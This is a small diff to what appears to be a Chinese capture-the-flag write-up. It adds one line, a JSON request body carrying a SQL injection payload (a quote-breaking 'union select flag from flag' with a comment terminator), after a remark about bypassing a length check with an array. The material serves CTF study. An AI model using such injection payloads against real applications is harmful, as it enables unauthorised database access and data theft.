@@ -19,7 +19,7 @@ len使用数组绕过,
 
 ---
 思路是对的,但是没构造出来...下次一定努力
-
+`{"code":["')union select flag from flag;#",""]}`
 
 # reverse
 
